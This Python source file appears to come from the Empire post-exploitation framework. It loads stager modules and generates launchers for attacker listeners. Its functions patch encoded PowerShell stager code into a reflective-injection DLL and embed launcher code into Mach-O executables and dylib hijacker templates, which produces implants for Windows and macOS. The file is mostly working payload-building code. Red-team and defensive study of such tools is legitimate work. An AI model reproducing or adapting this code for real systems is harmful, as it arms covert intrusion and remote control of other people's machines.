"""

Functionality that loads Empire stagers, sets generic stager options,
and abstracts the invocation of launcher generation.

The Stagers() class in instantiated in ./empire.py by the main menu and includes:

    load_stagers() - loads stagers from the install path
    set_stager_option() - sets and option for all stagers
    generate_launcher() - abstracted functionality that invokes the generate_launcher() method for a given listener
    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded stager code
    generate_macho() - generates a macho binary with an embedded python interpreter that runs the launcher code
    generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application

"""

import fnmatch
import imp
import helpers
import os
import macholib.MachO


class Stagers:

    def __init__(self, MainMenu, args):

        self.mainMenu = MainMenu
        self.args = args

        # stager module format:
        #     [ ("stager_name", instance) ]
        self.stagers = {}

        self.load_stagers()


    def load_stagers(self):
        """
        Load stagers from the install + "/lib/stagers/*" path
        """

        rootPath = "%s/lib/stagers/" % (self.mainMenu.installPath)
        pattern = '*.py'

        print helpers.color("[*] Loading stagers from: %s" % (rootPath))

        for root, dirs, files in os.walk(rootPath):
            for filename in fnmatch.filter(files, pattern):
                filePath = os.path.join(root, filename)

                # don't load up any of the templates
                if fnmatch.fnmatch(filename, '*template.py'):
                    continue

                # extract just the module name from the full path
                stagerName = filePath.split("/lib/stagers/")[-1][0:-3]

                # instantiate the module and save it to the internal cache
                self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])


    def set_stager_option(self, option, value):
        """
        Sets an option for all stagers.
        """

        for name, stager in self.stagers.iteritems():
            for stagerOption,stagerValue in stager.options.iteritems():
                if stagerOption == option:
                    stager.options[option]['Value'] = str(value)


    def generate_launcher(self, listenerName, language=None, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
        """
        Abstracted functionality that invokes the generate_launcher() method for a given listener,
        if it exists.
        """

        if not listenerName in self.mainMenu.listeners.activeListeners:
            print helpers.color("[!] Invalid listener: %s" % (listenerName))
            return ''

        activeListener = self.mainMenu.listeners.activeListeners[listenerName]

        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
        
        if launcherCode:
            return launcherCode


    def generate_dll(self, poshCode, arch):
        """
        Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
        """

        #read in original DLL and patch the bytes based on arch
        if arch.lower() == 'x86':
            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (self.mainMenu.installPath)
        else:
            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (self.mainMenu.installPath)

        if os.path.isfile(origPath):

            dllRaw = ''
            with open(origPath, 'rb') as f:
                dllRaw = f.read()

                replacementCode = helpers.decode_base64(poshCode)

                # patch the dll with the new PowerShell code
                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                index = dllRaw.find(searchString)
                dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):]

                return dllPatched

        else:
            print helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))


    def generate_macho(self, launcherCode):
        """
        Generates a macho binary with an embedded python interpreter that runs the launcher code.
        """

        MH_EXECUTE = 2
        f = open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb')
        # f = open(self.installPath + "/data/misc/machotemplate", 'rb')
        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
            print helpers.color("[!] Macho binary template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 13

        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedMachO
        else:
            print helpers.color("[!] Unable to patch MachO binary")


    def generate_dylib(self, launcherCode, arch, hijacker):
        """
        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
        """
        import macholib.MachO

        MH_DYLIB = 6
        if hijacker.lower() == 'true':
            if arch == 'x86':
                f = open("%s/data/misc/hijackers/template.dylib" % (self.mainMenu.installPath), 'rb')
            else:
                f = open("%s/data/misc/hijackers/template64.dylib" % (self.mainMenu.installPath), 'rb')
        else:
            if arch == 'x86':
                f = open("%s/data/misc/templateLauncher.dylib" % (self.mainMenu.installPath), 'rb')
            else:
                f = open("%s/data/misc/templateLauncher64.dylib" % (self.mainMenu.installPath), 'rb')

        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_DYLIB:
            print helpers.color("[!] Dylib template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 52
        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedDylib = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedDylib
        else:
            print helpers.color("[!] Unable to patch dylib")
